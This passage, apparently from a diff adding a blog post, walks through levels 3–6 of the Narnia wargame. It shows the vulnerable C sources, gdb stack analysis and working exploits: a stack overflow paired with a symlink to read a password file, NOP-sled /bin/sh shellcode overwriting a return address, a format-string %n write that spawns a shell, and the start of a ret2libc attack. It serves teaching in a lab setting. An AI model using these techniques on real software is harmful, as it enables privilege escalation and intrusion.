+</span><span class='line'>        printf("error opening %s\n", ifile);
+</span><span class='line'>        exit(-1);
+</span><span class='line'>    }
+</span><span class='line'>    
+</span><span class='line'>    /* copy from file1 to file2 */
+</span><span class='line'>    read(ifd, buf, sizeof(buf)-1);
+</span><span class='line'>    write(ofd,buf, sizeof(buf)-1);
+</span><span class='line'>    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);
+</span><span class='line'>
+</span><span class='line'>    /* close 'em */
+</span><span class='line'>    close(ifd);
+</span><span class='line'>    close(ofd);
+</span><span class='line'>
+</span><span class='line'>    exit(1);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again, this level is solved using a simple buffer overflow. Since <code>ofile</code> is stored just below <code>ifile</code> on the stack we can overflow <code>ifile</code> so that <code>ofile</code> is changed to a file we can actually open. The obvious choice for <code>ifile</code> is of course <code>/etc/narnia_pass/narnia4</code>, but unfortunately it&rsquo;s too short for our overflow. However, a possible solution is to symlink this file to a file with a long name that ends with the path to the file we wish to write to:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia3@melinda:/tmp/doge3$ ln -s /etc/narnia_pass/narnia4 $(python -c "print '\x41'*32 + 'pass'")
+</span><span class='line'>narnia3@melinda:/tmp/doge3$ touch pass
+</span><span class='line'>narnia3@melinda:/tmp/doge3$ /narnia/narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApass 
+</span><span class='line'>copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApass to a safer place... (pass)</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 4:</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;ctype.h&gt;
+</span><span class='line'>
+</span><span class='line'>extern char **environ;
+</span><span class='line'>
+</span><span class='line'>int main(int argc,char **argv){
+</span><span class='line'>    int i;
+</span><span class='line'>    char buffer[256];
+</span><span class='line'>
+</span><span class='line'>    for(i = 0; environ[i] != NULL; i++)
+</span><span class='line'>        memset(environ[i], '\0', strlen(environ[i]));
+</span><span class='line'>
+</span><span class='line'>    if(argc&gt;1)
+</span><span class='line'>        strcpy(buffer,argv[1]);
+</span><span class='line'>
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The obvious solution is to overwrite the return address with that of a shell-spawning shellcode. However, unlike previous levels we can&rsquo;t place our shellcode in an environment variable, as they are all zeroed before <code>main</code> returns. Fortunately, the stack is executable so we can place our shellcode there and change the return address so that it&rsquo;s executed. Using <code>gdb</code> we can extract the relevant memory locations:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia4@melinda:/narnia$ gdb -q --args ./narnia4 AAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>Reading symbols from /games/narnia/narnia4...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) set disassembly-flavor intel
+</span><span class='line'>(gdb) disas main
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>   0x08048444 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x08048445 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x08048447 &lt;+3&gt;:     push   edi
+</span><span class='line'>   0x08048448 &lt;+4&gt;:     and    esp,0xfffffff0
+</span><span class='line'>   0x0804844b &lt;+7&gt;:     sub    esp,0x130
+</span><span class='line'>   0x08048451 &lt;+13&gt;:    mov    DWORD PTR [esp+0x12c],0x0
+</span><span class='line'>   0x0804845c &lt;+24&gt;:    jmp    0x80484c0 &lt;main+124&gt;
+</span><span class='line'>   0x0804845e &lt;+26&gt;:    mov    eax,ds:0x80497d0
+</span><span class='line'>   0x08048463 &lt;+31&gt;:    mov    edx,DWORD PTR [esp+0x12c]
+</span><span class='line'>   0x0804846a &lt;+38&gt;:    shl    edx,0x2
+</span><span class='line'>   0x0804846d &lt;+41&gt;:    add    eax,edx
+</span><span class='line'>   0x0804846f &lt;+43&gt;:    mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x08048471 &lt;+45&gt;:    mov    DWORD PTR [esp+0x1c],0xffffffff
+</span><span class='line'>   0x08048479 &lt;+53&gt;:    mov    edx,eax
+</span><span class='line'>   0x0804847b &lt;+55&gt;:    mov    eax,0x0
+</span><span class='line'>   0x08048480 &lt;+60&gt;:    mov    ecx,DWORD PTR [esp+0x1c]
+</span><span class='line'>   0x08048484 &lt;+64&gt;:    mov    edi,edx
+</span><span class='line'>   0x08048486 &lt;+66&gt;:    repnz scas al,BYTE PTR es:[edi]
+</span><span class='line'>   0x08048488 &lt;+68&gt;:    mov    eax,ecx
+</span><span class='line'>   0x0804848a &lt;+70&gt;:    not    eax
+</span><span class='line'>   0x0804848c &lt;+72&gt;:    lea    ecx,[eax-0x1]
+</span><span class='line'>   0x0804848f &lt;+75&gt;:    mov    eax,ds:0x80497d0
+</span><span class='line'>   0x08048494 &lt;+80&gt;:    mov    edx,DWORD PTR [esp+0x12c]
+</span><span class='line'>   0x0804849b &lt;+87&gt;:    shl    edx,0x2
+</span><span class='line'>   0x0804849e &lt;+90&gt;:    add    eax,edx
+</span><span class='line'>   0x080484a0 &lt;+92&gt;:    mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x080484a2 &lt;+94&gt;:    mov    edx,ecx
+</span><span class='line'>   0x080484a4 &lt;+96&gt;:    mov    DWORD PTR [esp+0x8],edx
+</span><span class='line'>   0x080484a8 &lt;+100&gt;:   mov    DWORD PTR [esp+0x4],0x0
+</span><span class='line'>   0x080484b0 &lt;+108&gt;:   mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x080484b3 &lt;+111&gt;:   call   0x8048380 &lt;memset@plt&gt;
+</span><span class='line'>   0x080484b8 &lt;+116&gt;:   add    DWORD PTR [esp+0x12c],0x1
+</span><span class='line'>   0x080484c0 &lt;+124&gt;:   mov    eax,ds:0x80497d0
+</span><span class='line'>   0x080484c5 &lt;+129&gt;:   mov    edx,DWORD PTR [esp+0x12c]
+</span><span class='line'>   0x080484cc &lt;+136&gt;:   shl    edx,0x2
+</span><span class='line'>   0x080484cf &lt;+139&gt;:   add    eax,edx
+</span><span class='line'>   0x080484d1 &lt;+141&gt;:   mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x080484d3 &lt;+143&gt;:   test   eax,eax
+</span><span class='line'>   0x080484d5 &lt;+145&gt;:   jne    0x804845e &lt;main+26&gt;
+</span><span class='line'>   0x080484d7 &lt;+147&gt;:   cmp    DWORD PTR [ebp+0x8],0x1
+</span><span class='line'>   0x080484db &lt;+151&gt;:   jle    0x80484f5 &lt;main+177&gt;
+</span><span class='line'>   0x080484dd &lt;+153&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+</span><span class='line'>   0x080484e0 &lt;+156&gt;:   add    eax,0x4
+</span><span class='line'>   0x080484e3 &lt;+159&gt;:   mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x080484e5 &lt;+161&gt;:   mov    DWORD PTR [esp+0x4],eax
+</span><span class='line'>   0x080484e9 &lt;+165&gt;:   lea    eax,[esp+0x2c]
+</span><span class='line'>   0x080484ed &lt;+169&gt;:   mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x080484f0 &lt;+172&gt;:   call   0x8048350 &lt;strcpy@plt&gt;
+</span><span class='line'>   0x080484f5 &lt;+177&gt;:   mov    eax,0x0
+</span><span class='line'>   0x080484fa &lt;+182&gt;:   mov    edi,DWORD PTR [ebp-0x4]
+</span><span class='line'>   0x080484fd &lt;+185&gt;:   leave
+</span><span class='line'>   0x080484fe &lt;+186&gt;:   ret
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>(gdb) b *main+182
+</span><span class='line'>Breakpoint 1 at 0x80484fa
+</span><span class='line'>(gdb) r
+</span><span class='line'>Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAA
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x080484fa in main ()
+</span><span class='line'>(gdb) x/50xw $esp
+</span><span class='line'>0xffffd5e0:     0xffffd60c      0xffffd8ec      0x00000021      0xf7ff7d54
+</span><span class='line'>0xffffd5f0:     0xf7e2fe38      0x00000000      0x00000026      0xffffffff
+</span><span class='line'>0xffffd600:     0x00000000      0x00000000      0x00000001      0x41414141
+</span><span class='line'>0xffffd610:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd620:     0x41414141      0x00000000      0xf7ec4440      0xf7ec471e
+</span><span class='line'>0xffffd630:     0xffffd668      0xf7ffcff4      0xf7ffdad0      0xffffd754
+</span><span class='line'>0xffffd640:     0xffffd710      0xf7fe5fb9      0xffffd6f0      0x080481ec
+</span><span class='line'>0xffffd650:     0xffffd6d8      0xf7ffda74      0x00000000      0xf7fd32e8
+</span><span class='line'>0xffffd660:     0x00000001      0x00000000      0x00000001      0xf7ffd918
+</span><span class='line'>0xffffd670:     0x00000000      0x00000000      0x00000000      0xf7fceff4
+</span><span class='line'>0xffffd680:     0xffffd6ce      0xffffd6cf      0x00000001      0xf7ec4a79
+</span><span class='line'>0xffffd690:     0xffffd6cf      0xffffd6ce      0x00000000      0xf7ff249c
+</span><span class='line'>0xffffd6a0:     0xffffd754      0x00000000
+</span><span class='line'>(gdb) i f
+</span><span class='line'>Stack level 0, frame at 0xffffd720:
+</span><span class='line'>eip = 0x80484fa in main; saved eip 0xf7e454b3
+</span><span class='line'>Arglist at 0xffffd718, args:
+</span><span class='line'>Locals at 0xffffd718, Previous frame's sp is 0xffffd720
+</span><span class='line'>Saved registers:
+</span><span class='line'>ebp at 0xffffd718, edi at 0xffffd714, eip at 0xffffd71c
+</span><span class='line'>(gdb) p 0xffffd71c-0xffffd60c
+</span><span class='line'>$1 = 272</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Overwriting the return address with an incorrect address can cause our shellcode not be executed and since we can&rsquo;t use the debugger to get the exact location of our shellcode we&rsquo;ve got a problem. A possible solution is make the program segfault and analyze the core dump, but since we need to fill the stack with junk bytes anyway (in addition to our shellcode) until overwriting the return address we can use them to form a <a href="http://en.wikipedia.org/wiki/NOP_slide">nop-sled</a>, which will give us some flexibility regarding the return address.</p>
+
+<p>Examining the stack with an appropriate input size (276 bytes), we see the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia4@melinda:/narnia$ gdb -q --args ./narnia4 $(python -c "print '\x41'*276") 
+</span><span class='line'>Reading symbols from /games/narnia/narnia4...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) b *main+182
+</span><span class='line'>Breakpoint 1 at 0x80484fa
+</span><span class='line'>(gdb) r
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x080484fa in main ()
+</span><span class='line'>(gdb) x/100xw $esp
+</span><span class='line'>0xffffd4e0:     0xffffd50c      0xffffd7f0      0x00000021      0xf7ff7d54
+</span><span class='line'>0xffffd4f0:     0xf7e2fe38      0x00000000      0x00000026      0xffffffff
+</span><span class='line'>0xffffd500:     0x00000000      0x00000000      0x00000001      0x41414141
+</span><span class='line'>0xffffd510:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd520:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd530:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd540:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd550:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd560:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd570:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd580:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd590:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd5a0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd5b0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd5c0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd5d0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd5e0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd5f0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd600:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd610:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd620:     0x00000000      0xffffd6b4      0xffffd6c0      0xf7fd3000
+</span><span class='line'>0xffffd630:     0x00000000      0xffffd61c      0xffffd6c0      0x00000000
+</span><span class='line'>0xffffd640:     0x0804824c      0xf7fceff4      0x00000000      0x00000000
+</span><span class='line'>0xffffd650:     0x00000000      0x7d265f34      0x4a22fb24      0x00000000
+</span><span class='line'>0xffffd660:     0x00000000      0x00000000      0x00000002      0x08048390
+</span><span class='line'>(gdb) i f
+</span><span class='line'>Stack level 0, frame at 0xffffd620:
+</span><span class='line'> eip = 0x80484fa in main; saved eip 0x41414141
+</span><span class='line'> Arglist at 0xffffd618, args: 
+</span><span class='line'> Locals at 0xffffd618, Previous frame's sp is 0xffffd620
+</span><span class='line'> Saved registers:
+</span><span class='line'> ebp at 0xffffd618, edi at 0xffffd614, eip at 0xffffd61c</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our input starts at <code>0xffffd50c</code> and the return address is at <code>0xffffd61c</code>. Thus, a good value to overwrite the return address with is <code>0xffffd596</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia4@melinda:/narnia$ cd /tmp/doge4
+</span><span class='line'>narnia4@melinda:/tmp/doge4$ vim input.py 
+</span><span class='line'>narnia4@melinda:/tmp/doge4$ cat input.py 
+</span><span class='line'>shellcode = ('\x90'*227 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69' +
+</span><span class='line'>             '\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80' +
+</span><span class='line'>             '\x41'*20 + '\x96\xd5\xff\xff')
+</span><span class='line'>print shellcode
+</span><span class='line'>narnia4@melinda:/tmp/doge4$ /narnia/narnia4 $(python input.py)
+</span><span class='line'>$ whoami
+</span><span class='line'>narnia5</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 5:</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv){
+</span><span class='line'>    int i = 1;
+</span><span class='line'>    char buffer[64];
+</span><span class='line'>
+</span><span class='line'>    snprintf(buffer, sizeof buffer, argv[1]);
+</span><span class='line'>    buffer[sizeof (buffer) - 1] = 0;
+</span><span class='line'>    printf("Change i's value from 1 -&gt; 500. ");
+</span><span class='line'>
+</span><span class='line'>    if(i==500){
+</span><span class='line'>        printf("GOOD\n");
+</span><span class='line'>        system("/bin/sh");
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    printf("No way...let me give you a hint!\n");
+</span><span class='line'>    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
+</span><span class='line'>    printf ("i = %d (%p)\n", i, &i);
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we can&rsquo;t change the value of <code>i</code> using a simple buffer overflow since the <code>snprintf</code> function limits the number of bytes that are written to the stack. However, using a simple format string exploit we can make this function write to arbitrary memory locations. Using <code>ltrace</code> we&rsquo;ll first find which parameter number corresponds to our format string:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia5@melinda:/narnia$ ltrace -s 500 ./narnia5 $(python -c "print 'AAAA' + '%8\$08x'")
+</span><span class='line'>__libc_start_main(0x8048444, 2, -10284, 0x8048520, 0x8048590 &lt;unfinished ...&gt;
+</span><span class='line'>snprintf("AAAAffffd73c", 64, "AAAA%8$08x", 0xf7e5efc3)                                                                           = 12
+</span><span class='line'>printf("Change i's value from 1 -&gt; 500. ")                                                                                       = 32
+</span><span class='line'>puts("No way...let me give you a hint!"Change i's value from 1 -&gt; 500. No way...let me give you a hint!
+</span><span class='line'>)                                                                                         = 33
+</span><span class='line'>printf("buffer : [%s] (%d)\n", "AAAAffffd73c", 12buffer : [AAAAffffd73c] (12)
+</span><span class='line'>)                                                                               = 29
+</span><span class='line'>printf("i = %d (%p)\n", 1, 0xffffd72ci = 1 (0xffffd72c)
+</span><span class='line'>)                                                                                           = 19
+</span><span class='line'>+++ exited (status 0) +++
+</span><span class='line'>narnia5@melinda:/narnia$ ltrace -s 500 ./narnia5 $(python -c "print 'AAAA' + '%9\$08x'")
+</span><span class='line'>__libc_start_main(0x8048444, 2, -10284, 0x8048520, 0x8048590 &lt;unfinished ...&gt;
+</span><span class='line'>snprintf("AAAA41414141", 64, "AAAA%9$08x", 0xf7e5efc3)                                                                           = 12
+</span><span class='line'>printf("Change i's value from 1 -&gt; 500. ")                                                                                       = 32
+</span><span class='line'>puts("No way...let me give you a hint!"Change i's value from 1 -&gt; 500. No way...let me give you a hint!
+</span><span class='line'>)                                                                                         = 33
+</span><span class='line'>printf("buffer : [%s] (%d)\n", "AAAA41414141", 12buffer : [AAAA41414141] (12)
+</span><span class='line'>)                                                                               = 29
+</span><span class='line'>printf("i = %d (%p)\n", 1, 0xffffd72ci = 1 (0xffffd72c)
+</span><span class='line'>)                                                                                           = 19
+</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>which is <code>9</code>. Now it&rsquo;s possible to use the <code>%n</code> specifier in order to write the printed number of bytes to the the variable <code>i</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia5@melinda:/narnia$ ./narnia5 $(printf "\x2c\xd7\xff\xff")%496x%9\$n
+</span><span class='line'>Change i's value from 1 -&gt; 500. GOOD
+</span><span class='line'>$ whoami
+</span><span class='line'>narnia6</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 6:</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>extern char **environ;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char *argv[]){
+</span><span class='line'>    char b1[8], b2[8];
+</span><span class='line'>    int  (*fp)(char *)=(int(*)(char *))&puts, i;
+</span><span class='line'>
+</span><span class='line'>    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
+</span><span class='line'>
+</span><span class='line'>    /* clear environ */
+</span><span class='line'>    for(i=0; environ[i] != NULL; i++)
+</span><span class='line'>        memset(environ[i], '\0', strlen(environ[i]));
+</span><span class='line'>    /* clear argz    */
+</span><span class='line'>    for(i=3; argv[i] != NULL; i++)
+</span><span class='line'>        memset(argv[i], '\0', strlen(argv[i]));
+</span><span class='line'>
+</span><span class='line'>    strcpy(b1,argv[1]);
+</span><span class='line'>    strcpy(b2,argv[2]);
+</span><span class='line'>    if(((unsigned long)fp & 0xff000000) == 0xff000000)
+</span><span class='line'>        exit(-1);
+</span><span class='line'>    fp(b1);
+</span><span class='line'>
+</span><span class='line'>    exit(1);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Unlike previous levels, in this level the stack isn&rsquo;t executable, thus preventing us from directing execution flow to our shellcode. However, what we can do is change <code>fp</code> to point to a different function than <code>puts</code>. A worthy choice is <code>system</code>, which has the same signature as <code>puts</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>SYSTEM(3)                       Linux Programmer's Manual                       SYSTEM(3)
+</span><span class='line'>
+</span><span class='line'>NAME
+</span><span class='line'>       system - execute a shell command
+</span><span class='line'>
+</span><span class='line'>       SYNOPSIS
+</span><span class='line'>              #include &lt;stdlib.h&gt;
+</span><span class='line'>
+</span><span class='line'>              int system(const char *command);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Thankfully, <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> isn&rsquo;t used, so this is a classic <a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a> scenario. We begin by retrieving the address of <code>system</code> and examining the stack just before the call to <code>fp</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
